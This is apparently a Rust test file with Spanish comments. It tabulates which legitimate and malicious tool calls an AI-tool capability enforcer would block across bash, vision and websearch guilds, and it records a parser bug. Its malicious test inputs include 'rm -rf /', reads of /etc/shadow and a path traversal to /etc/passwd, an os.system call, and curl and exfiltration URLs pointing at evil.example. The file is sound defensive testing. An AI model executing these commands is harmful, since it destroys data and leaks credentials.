//! T-DSH-32 — fase F0 del ADR-022: "¿qué se rompe si se enciende
//! `capabilities_enforce`?".
//!
//! `enforce_capabilities` (`registry/guild_process.rs`) es una función pública y
//! pura: se puede medir sin arrancar kernel ni guilds. Este test:
//!
//! 1. lee las CAPABILITIES **declaradas** en el `.py` de las tres guilds que
//!    hoy las tienen (`bash`, `vision`, `websearch`), las fija y las usa como
//!    entrada real de la matriz;
//! 2. comprueba qué expone el **catálogo** (`router::catalog::builtin_catalog`,
//!    que parsea esas declaraciones con `extract_capabilities`): HOY solo
//!    `bash`; las declaraciones multilínea de `vision` y `websearch` las pierde
//!    el parser (bug de extract_capabilities, ver `catalog_capability_parser_gap`)
//!    y por tanto `check_capabilities` las trata como "sin CAPABILITIES";
//! 3. para cada herramienta que exponen (nombres y argumentos de su `.py`)
//!    construye llamadas representativas, incluidas los casos límite: comandos
//!    con comillas, rutas absolutas, `cwd` externo, rutas con `..` y
//!    herramientas cuyo nombre contiene run/exec/shell/command;
//! 4. llama a `enforce_capabilities` y tabula herramienta × llamada ×
//!    BLOQUEADA/PERMITIDA × motivo;
//! 5. marca las llamadas LEGÍTIMAS que se bloquearían (falsos bloqueos) y las
//!    MALICIOSAS que pasarían. Fija el comportamiento actual: si alguien cambia
//!    el enforcement (o arregla el parser), este test lo dice y hay que revisar
//!    la conclusión de F0.
//!
//! Run:
//!   rustup run 1.99.1 cargo test -p tylluan-kernel --test capabilities_enforce_matrix -- --nocapture

use std::path::{Path, PathBuf};

use rmcp::model::CallToolRequestParam;
use serde_json::{Value, json};
use tylluan_kernel::registry::guild_process::enforce_capabilities;
use tylluan_kernel::router::catalog::builtin_catalog;

#[derive(Clone, Copy, PartialEq, Eq)]
enum Kind {
    Legit,
    Malicious,
}

impl Kind {
    fn label(self) -> &'static str {
        match self {
            Kind::Legit => "legitima",
            Kind::Malicious => "maliciosa",
        }
    }
}

struct Case {
    guild: &'static str,
    tool: &'static str,
    args: &'static [(&'static str, &'static str)],
    kind: Kind,
    note: &'static str,
    /// Comportamiento medido HOY (2026-10-22) con las CAPABILITIES declaradas.
    expect_blocked: bool,
}

const CASES: &[Case] = &[
    // ── bash: {"process_execution": true} — bool true = sin allowlist ────────
    Case {
        guild: "bash",
        tool: "state_checkpoint",
        args: &[("reason", "manual")],
        kind: Kind::Legit,
        note: "checkpoint de estado",
        expect_blocked: false,
    },
    Case {
        guild: "bash",
        tool: "state_restore",
        args: &[],
        kind: Kind::Legit,
        note: "restaurar estado",
        expect_blocked: false,
    },
    Case {
        guild: "bash",
        tool: "bash_execute",
        args: &[("command", "echo hello")],
        kind: Kind::Legit,
        note: "comando simple",
        expect_blocked: false,
    },
    Case {
        guild: "bash",
        tool: "bash_execute",
        args: &[("command", "cargo test -p tylluan-kernel"), ("cwd", "E:\\tylluan-wt-dsh")],
        kind: Kind::Legit,
        note: "cargo test en el workspace",
        expect_blocked: false,
    },
    Case {
        guild: "bash",
        tool: "bash_execute",
        // Comillas y metacaracteres: la allowlist del primer token de la guild
        // es defensa en profundidad, no frontera; aqui process_execution=true.
        args: &[("command", "echo \"hola mundo\"; rm -rf /tmp/x")],
        kind: Kind::Malicious,
        note: "comando con comillas + destructivo (bool true no filtra)",
        expect_blocked: false,
    },
    Case {
        guild: "bash",
        tool: "bash_execute",
        args: &[
            ("command", "/usr/bin/env python3 -c 'import os; os.system(\"id\")'"),
            ("cwd", "C:\\Windows\\System32"),
        ],
        kind: Kind::Malicious,
        note: "ruta absoluta + cwd externo (sin filesystem_scope)",
        expect_blocked: false,
    },
    // ── vision: process_execution false, filesystem_scope ["/"], network [] ──
    Case {
        guild: "vision",
        tool: "vision_device_status",
        args: &[],
        kind: Kind::Legit,
        note: "estado del device",
        expect_blocked: false,
    },
    Case {
        guild: "vision",
        tool: "vision_analyze",
        args: &[("image_path", "/tmp/foto.png"), ("prompt", "Describe")],
        kind: Kind::Legit,
        note: "imagen en ruta absoluta POSIX",
        expect_blocked: false,
    },
    Case {
        guild: "vision",
        tool: "vision_analyze",
        args: &[("image_path", "C:\\Users\\x\\foto.png")],
        kind: Kind::Legit,
        note: "imagen en ruta absoluta Windows",
        expect_blocked: false,
    },
    Case {
        guild: "vision",
        tool: "vision_ocr",
        args: &[("image_path", "/var/tmp/doc.png")],
        kind: Kind::Legit,
        note: "OCR de imagen legitima",
        expect_blocked: false,
    },
    Case {
        guild: "vision",
        tool: "vision_extract",
        args: &[("image_path", "/etc/shadow"), ("schema", "{}")],
        kind: Kind::Malicious,
        note: "lee fichero de host (scope \"/\" es comodin)",
        expect_blocked: false,
    },
    Case {
        guild: "vision",
        tool: "vision_analyze",
        args: &[("image_path", "../../../../etc/passwd")],
        kind: Kind::Malicious,
        note: "traversal relativo (el scope no se canonicaliza)",
        expect_blocked: false,
    },
    Case {
        guild: "vision",
        tool: "execute_python",
        args: &[("code", "print(1)")],
        kind: Kind::Malicious,
        note: "nombre de herramienta exec-like",
        expect_blocked: true,
    },
    Case {
        guild: "vision",
        tool: "vision_analyze",
        args: &[("image_path", "/tmp/a.png"), ("command", "rm -rf /")],
        kind: Kind::Malicious,
        note: "argumento 'command' inyectado en herramienta no-exec",
        expect_blocked: true,
    },
    // ── websearch: process_execution false, network_hosts, filesystem [] ────
    Case {
        guild: "websearch",
        tool: "web_search",
        args: &[("query", "rust async")],
        kind: Kind::Legit,
        note: "busqueda normal",
        expect_blocked: false,
    },
    Case {
        guild: "websearch",
        tool: "web_search",
        args: &[("intent", "buscar noticias")],
        kind: Kind::Legit,
        note: "busqueda por intent",
        expect_blocked: false,
    },
    Case {
        guild: "websearch",
        tool: "web_search",
        args: &[("query", "")],
        kind: Kind::Legit,
        note: "query vacia (el codigo decide despues)",
        expect_blocked: false,
    },
    Case {
        guild: "websearch",
        tool: "web_search",
        // websearch.py (línea 44): `q = query or intent or command` — `command`
        // es el tercer fallback LEGÍTIMO de la query, no un comando de shell.
        args: &[("command", "rust async")],
        kind: Kind::Legit,
        note: "FALSO BLOQUEO: 'command' es fallback de query en el .py",
        expect_blocked: true,
    },
    Case {
        guild: "websearch",
        tool: "run_shell",
        args: &[("args", "curl http://evil.example")],
        kind: Kind::Malicious,
        note: "nombre exec-like sin argumento command",
        expect_blocked: true,
    },
    Case {
        guild: "websearch",
        tool: "web_search",
        args: &[("query", "x"), ("url", "http://evil.example/exfil")],
        kind: Kind::Malicious,
        note: "dominio ajeno (network_hosts no se aplica nunca)",
        expect_blocked: false,
    },
    Case {
        guild: "websearch",
        tool: "web_search",
        args: &[("query", "x"), ("path", "C:\\Windows")],
        kind: Kind::Malicious,
        note: "ruta de FS con filesystem_scope vacio (no se aplica)",
        expect_blocked: false,
    },
];

fn repo_file(rel: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../..").join(rel)
}

/// Parseo CORRECTO de la declaración `CAPABILITIES = { ... }` del `.py` (a
/// diferencia de `extract_capabilities`, cierra el bloque multilínea).
fn declared_capabilities(rel: &str) -> Value {
    let path = repo_file(rel);
    let content = std::fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("no se pudo leer {}: {e}", path.display()));
    let mut collecting = false;
    let mut depth = 0usize;
    let mut buf = String::new();
    for line in content.lines() {
        let t = line.trim();
        if !collecting {
            if let Some(pos) = t.find("CAPABILITIES") {
                let after = t[pos + 12..].trim();
                if let Some(rest) = after.strip_prefix('=') {
                    let rest = rest.trim();
                    if rest.starts_with('{') {
                        collecting = true;
                        buf.push_str(rest);
                        for ch in rest.chars() {
                            match ch {
                                '{' => depth += 1,
                                '}' => depth = depth.saturating_sub(1),
                                _ => {}
                            }
                        }
                        if depth == 0 {
                            break;
                        }
                    }
                }
            }
        } else {
            buf.push(' ');
            buf.push_str(t);
            for ch in t.chars() {
                match ch {
                    '{' => depth += 1,
                    '}' => depth = depth.saturating_sub(1),
                    _ => {}
                }
            }
            if depth == 0 {
                break;
            }
        }
    }
    let js = buf
        .replace("True", "true")
        .replace("False", "false")
        .replace("None", "null")
        // Python permite coma final antes de `}`; JSON no.
        .replace(", }", "}")
        .replace(",}", "}");
    serde_json::from_str(&js).unwrap_or_else(|e| {
        panic!("CAPABILITIES no parseables en {}: {e} (payload: {js})", path.display())
    })
}

fn expected_caps(guild: &str) -> Value {
    match guild {
        "bash" => json!({"process_execution": true}),
        "vision" => json!({
            "process_execution": false,
            "filesystem_scope": ["/"],
            "network_hosts": [],
        }),
        "websearch" => json!({
            "process_execution": false,
            "network_hosts": ["127.0.0.1:32700"],
            "filesystem_scope": [],
        }),
        other => panic!("guild sin CAPABILITIES esperadas: {other}"),
    }
}

fn params(tool: &str, args: &[(&str, &str)]) -> CallToolRequestParam {
    let mut map = serde_json::Map::new();
    for (k, v) in args {
        map.insert((*k).to_string(), Value::String((*v).to_string()));
    }
    CallToolRequestParam {
        name: tool.to_string().into(),
        arguments: if map.is_empty() { None } else { Some(map) },
    }
}

/// Bug actual del catálogo: `extract_capabilities` solo cierra dicts de una
/// línea; en las declaraciones multilínea se corta en la última línea (`}`) sin
/// añadirla → JSON truncado → `None`. Consecuencia: `vision` y `websearch`
/// entran en `check_capabilities` como "sin CAPABILITIES" y NUNCA se enforzan.
/// Este test fija ese estado; cuando se arregle, fallará aquí y habrá que
/// actualizar la matriz y la conclusión de F0.
#[test]
fn catalog_capability_parser_gap() {
    let catalog = builtin_catalog();
    assert!(!catalog.is_empty(), "catálogo vacío: ¿no se encontró guilds/?");

    let with_caps: Vec<&str> = catalog
        .iter()
        .filter(|g| g.capabilities.is_some())
        .map(|g| g.name.as_str())
        .collect();
    println!("catalogo: guilds con capabilities declaradas y PARSEADAS = {with_caps:?}");
    assert_eq!(
        with_caps,
        vec!["bash"],
        "el parser del catálogo cambió: hoy solo bash (dict de una línea) llega con capabilities; \
         si vision/websearch ya aparecen, actualizar la matriz F0 de T-DSH-32"
    );

    let bash = catalog.iter().find(|g| g.name == "bash").unwrap();
    assert_eq!(
        bash.capabilities.as_ref().unwrap(),
        &declared_capabilities("guilds/builders/plugins/bash.py"),
        "las capabilities parseadas de bash deben coincidir con su .py"
    );

    for (guild, rel) in [
        ("vision", "guilds/core/vision.py"),
        ("websearch", "guilds/core/websearch.py"),
    ] {
        let desc = catalog
            .iter()
            .find(|g| g.name == guild)
            .unwrap_or_else(|| panic!("guild '{guild}' ausente del catálogo"));
        assert!(
            desc.capabilities.is_none(),
            "'{guild}' ya tiene capabilities parseadas: el parser está arreglado; \
             actualizar la matriz F0 de T-DSH-32 con ellas"
        );
        // La declaración del .py SÍ existe y es la que usa la matriz de abajo.
        assert_eq!(
            declared_capabilities(rel),
            expected_caps(guild),
            "CAPABILITIES declaradas por '{guild}' distintas de las esperadas"
        );
        println!(
            "catalogo: {guild} tiene CAPABILITIES en su .py, pero el catálogo las pierde (null)"
        );
    }
}

#[test]
fn capabilities_enforce_matrix_fixes_current_behaviour() {
    // Entrada real de la matriz: las CAPABILITIES declaradas en cada .py.
    let caps: Vec<(&str, Value)> = ["bash", "vision", "websearch"]
        .iter()
        .map(|name| (*name, declared_capabilities(match *name {
            "bash" => "guilds/builders/plugins/bash.py",
            "vision" => "guilds/core/vision.py",
            _ => "guilds/core/websearch.py",
        })))
        .collect();

    println!(
        "{:<10} {:<22} {:<10} {:<10} {:<12} motivo / nota",
        "guild", "herramienta", "clase", "resultado", "falso?"
    );
    let mut false_blocks: Vec<&Case> = Vec::new();
    let mut malicious_passing: Vec<&Case> = Vec::new();
    let mut mismatches: Vec<String> = Vec::new();

    for case in CASES {
        let (_, guild_caps) = caps
            .iter()
            .find(|(name, _)| *name == case.guild)
            .unwrap_or_else(|| panic!("sin caps para {}", case.guild));
        let verdict = enforce_capabilities(case.guild, guild_caps, &params(case.tool, case.args));
        let blocked = verdict.is_some();
        let false_block = case.kind == Kind::Legit && blocked;
        let missed = case.kind == Kind::Malicious && !blocked;
        if false_block {
            false_blocks.push(case);
        }
        if missed {
            malicious_passing.push(case);
        }
        if blocked != case.expect_blocked {
            mismatches.push(format!(
                "{}.{} esperado_blocked={} real={} (motivo: {:?})",
                case.guild, case.tool, case.expect_blocked, blocked, verdict
            ));
        }
        println!(
            "{:<10} {:<22} {:<10} {:<10} {:<12} {}{}",
            case.guild,
            case.tool,
            case.kind.label(),
            if blocked { "BLOQUEADA" } else { "PERMITIDA" },
            if false_block { "FALSO BLOQUEO" } else { "" },
            case.note,
            match &verdict {
                Some(msg) => format!(" -> {msg}"),
                None => String::new(),
            }
        );
    }

    println!();
    println!(
        "resumen: {} llamadas, {} legitimas bloqueadas (falsos bloqueos), {} maliciosas que pasan",
        CASES.len(),
        false_blocks.len(),
        malicious_passing.len()
    );
    for c in &false_blocks {
        println!("  falso bloqueo: {}.{} ({})", c.guild, c.tool, c.note);
    }
    for c in &malicious_passing {
        println!("  maliciosa que pasa: {}.{} ({})", c.guild, c.tool, c.note);
    }

    assert!(
        mismatches.is_empty(),
        "veredictos distintos de la linea base: {mismatches:?}"
    );
    assert_eq!(
        false_blocks.len(),
        1,
        "hoy hay exactamente UN falso bloqueo (web_search con argumento command); si cambió, revisar D-32/ADR-022"
    );
    assert_eq!(
        false_blocks[0].guild, "websearch",
        "el falso bloqueo esperado es websearch.web_search"
    );
    assert_eq!(
        malicious_passing.len(),
        6,
        "hoy pasan exactamente SEIS llamadas maliciosas; si cambió, revisar D-32/ADR-022"
    );
}
